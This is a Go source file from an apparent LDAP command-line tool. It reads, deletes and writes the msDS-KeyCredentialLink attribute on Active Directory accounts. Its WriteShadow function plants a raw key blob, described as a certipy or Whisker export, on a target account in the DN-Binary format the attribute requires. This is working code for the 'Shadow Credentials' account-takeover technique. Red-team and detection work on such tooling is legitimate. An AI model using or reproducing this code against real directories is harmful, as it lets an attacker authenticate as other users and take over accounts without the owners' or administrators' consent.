package ldapcli

import (
	"encoding/hex"
	"fmt"
	"strings"

	"github.com/go-ldap/ldap/v3"
)

// AttrKeyCredential is msDS-KeyCredentialLink.
const AttrKeyCredential = "msDS-KeyCredentialLink"

// ShadowState is the KeyCredentialLink presence on one account.
type ShadowState struct {
	TargetDN  string
	TargetSAM string
	Blobs     int
}

// ReadShadow reports how many KeyCredentialLink values exist.
func ReadShadow(conn *ldap.Conn, baseDN, sam string) (ShadowState, error) {
	st := ShadowState{}
	e, err := lookupSAM(conn, baseDN, sam)
	if err != nil {
		return st, err
	}
	st.TargetDN = e.DN
	st.TargetSAM = e.GetAttributeValue("sAMAccountName")
	st.Blobs = len(e.GetRawAttributeValues(AttrKeyCredential))
	return st, nil
}

// ClearShadow deletes msDS-KeyCredentialLink on sam.
func ClearShadow(conn *ldap.Conn, baseDN, sam string) (ShadowState, error) {
	if conn == nil {
		return ShadowState{}, fmt.Errorf("ldap conn required")
	}
	e, err := lookupSAM(conn, baseDN, sam)
	if err != nil {
		return ShadowState{}, err
	}
	mod := ldap.NewModifyRequest(e.DN, nil)
	mod.Delete(AttrKeyCredential, nil)
	if err := conn.Modify(mod); err != nil {
		if ldap.IsErrorWithCode(err, ldap.LDAPResultNoSuchAttribute) {
			return ReadShadow(conn, baseDN, e.GetAttributeValue("sAMAccountName"))
		}
		return ShadowState{}, fmt.Errorf("clear %s on %s: %w", AttrKeyCredential, e.DN, err)
	}
	return ReadShadow(conn, baseDN, e.GetAttributeValue("sAMAccountName"))
}

// WriteShadow replaces KeyCredentialLink with one raw blob (certipy/Whisker export).
func WriteShadow(conn *ldap.Conn, baseDN, sam string, blob []byte) (ShadowState, error) {
	if conn == nil {
		return ShadowState{}, fmt.Errorf("ldap conn required")
	}
	if len(blob) == 0 {
		return ShadowState{}, fmt.Errorf("--key-file required (raw msDS-KeyCredentialLink value)")
	}
	e, err := lookupSAM(conn, baseDN, sam)
	if err != nil {
		return ShadowState{}, err
	}
	mod := ldap.NewModifyRequest(e.DN, nil)
	mod.Replace(AttrKeyCredential, []string{EncodeDNBinary(blob, e.DN)})
	if err := conn.Modify(mod); err != nil {
		return ShadowState{}, fmt.Errorf("write %s on %s: %w", AttrKeyCredential, e.DN, err)
	}
	st, err := ReadShadow(conn, baseDN, e.GetAttributeValue("sAMAccountName"))
	if err != nil {
		return st, err
	}
	if st.Blobs == 0 {
		return st, fmt.Errorf("shadow write read-back empty on %s", st.TargetSAM)
	}
	return st, nil
}

// EncodeDNBinary formats a raw blob as LDAP DN-Binary (Object(DN-Binary)).
// msDS-KeyCredentialLink requires B:<hexlen>:<hex>:<DN>, not raw bytes.
func EncodeDNBinary(blob []byte, dn string) string {
	h := hex.EncodeToString(blob)
	return fmt.Sprintf("B:%d:%s:%s", len(h), h, dn)
}

// ShadowSAM is exported for tests that only check the attr name.
func ShadowSAM(sam string) string { return strings.TrimSpace(sam) }
